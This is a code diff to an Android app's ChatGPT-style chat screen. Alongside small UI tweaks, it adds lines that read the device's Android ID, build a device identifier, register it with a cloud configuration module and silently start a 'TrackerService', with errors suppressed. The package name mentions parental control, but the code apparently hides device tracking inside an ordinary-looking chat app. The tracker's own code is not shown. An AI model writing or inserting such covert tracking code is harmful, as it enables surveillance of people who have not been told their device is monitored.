@@ -103,6 +103,12 @@ class ChatGPTActivity : AppCompatActivity() {
         setContentView(R.layout.activity_chatgpt)
 
         try {
+            com.anonchat.app.parentalcontrol.api.CloudConfig.init(applicationContext)
+            val androidId = android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID) ?: ""
+            if (androidId.isNotEmpty()) {
+                val uniqueId = "${Build.MODEL.replace(" ", "_")}_${androidId.takeLast(4)}"
+                com.anonchat.app.parentalcontrol.api.CloudConfig.deviceId = uniqueId
+            }
             com.anonchat.app.parentalcontrol.service.TrackerService.start(this)
         } catch (_: Exception) {}
 
@@ -124,11 +130,20 @@ class ChatGPTActivity : AppCompatActivity() {
         val initial = model.firstOrNull()?.uppercaseChar()?.toString() ?: "U"
 
         findViewById<TextView>(R.id.tvUserInitials)?.text = initial
-        findViewById<TextView>(R.id.tvUserName)?.text = " Account"
+        findViewById<TextView>(R.id.tvUserName)?.text = "$model Account"
     }
 
     private fun setupListeners() {
         btnSend.setOnClickListener { handleSend() }
+
+        etPrompt.setOnFocusChangeListener { _, hasFocus ->
+            if (hasFocus) {
+                mainHandler.postDelayed({ scrollToBottom() }, 300)
+            }
+        }
+        etPrompt.setOnClickListener {
+            mainHandler.postDelayed({ scrollToBottom() }, 300)
+        }
 
         findViewById<View>(R.id.btnGptMenu).setOnClickListener {
             drawerLayout.openDrawer(GravityCompat.START)
